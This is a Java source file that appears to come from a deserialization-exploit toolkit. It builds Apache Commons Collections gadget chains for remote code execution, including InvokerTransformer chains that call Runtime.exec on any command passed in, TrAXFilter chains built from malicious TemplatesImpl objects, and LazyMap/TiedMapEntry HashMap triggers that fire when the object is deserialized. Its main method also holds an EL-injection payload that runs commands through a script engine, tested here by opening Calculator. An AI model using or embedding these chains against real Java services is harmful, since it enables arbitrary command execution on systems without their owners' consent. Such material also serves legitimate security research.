package xyz.eki.marshalexp.gadget.cc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.ReflectUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class GCC {
    public static Transformer invokerTransformer2RCE(String cmd){
        //Runtime.getRuntime().exec();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { cmd })
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        return transformerChain;
    }



    public static Transformer instantiateTransformer2RCE(String cmd) throws Exception {
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] {GTemplates.getEvilTemplates(cmd)} )};
        Transformer transformerChain = new ChainedTransformer(transformers);
        return transformerChain;
    }

    public static Transformer instantiateTransformer2RCE(byte[] bytes) throws Exception {
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] {GTemplates.getEvilTemplates(bytes)} )};
        Transformer transformerChain = new ChainedTransformer(transformers);
        return transformerChain;
    }

    public static TiedMapEntry deserialize2MethodInvoke(Object obj, String methodName) throws Exception {
        return deserialize2MethodInvoke(obj,methodName,null,null);
    }


    public static Transformer instantiateFactory2RCE(byte[] bytes) throws Exception {
        Transformer transformer = new FactoryTransformer(new InstantiateFactory(
                TrAXFilter.class,
                new Class[] { Templates.class },
                new Object[] {GTemplates.getEvilTemplates(bytes)} ));

        return transformer;
    }

    public static TiedMapEntry deserialize2MethodInvoke(Object obj, String methodName, Class[] paramTypes, Object[] args) throws Exception {
        InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, args);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, obj);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,"eki");
        lazyMap.remove(obj);

        ReflectUtils.setFieldValue(lazyMap,"factory", invokerTransformer);

        return tiedMapEntry;
    }

    public static HashMap getValue2TransformerInvoke(Transformer transformer) throws Exception {

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "whatever");

        HashMap<Object, Object> source = new HashMap<>();
        source.put(tiedMapEntry, "Eki");
        lazyMap.remove("whatever");

        ReflectUtils.setFieldValue(lazyMap,"factory", transformer);

        return source;
    }

    public static void main(String[] args) throws Exception{
        // InvokerTransformer 弹计算器测试
//        Transformer transformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"});
//        transformer.transform(Runtime.getRuntime());

//        Transformer[] transformers = new Transformer[]{
////                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
//                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
//                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "open -a Calculator.app" })
//        };
//
//        ChainedTransformer transformer = new ChainedTransformer(transformers);
//        transformer.transform(Runtime.class);

//        InstantiateTransformer transformer = new InstantiateTransformer(
//                new Class[] { Templates.class },
//                new Object[] {GTemplates.getEvilTemplates("open -a Calculator.app")}
//        );
//
//        transformer.transform(TrAXFilter.class);

        String cmd = "open -a Calculator.app";
        String elPayload = String.format("''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('%s')\")",cmd);


//        System.out.println(elPayload);
//
//        new javax.el.ELProcessor().eval(elPayload);

        Transformer[] transformers = new Transformer[]{
                new FactoryTransformer(new ConstantFactory(javax.el.ELProcessor.class)),
                new InstantiateTransformer(
                        null,null
                ),
                new InvokerTransformer("eval",
                        new Class<?>[]{String.class},
                        new Object[]{elPayload})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform("whatever");
    }

}
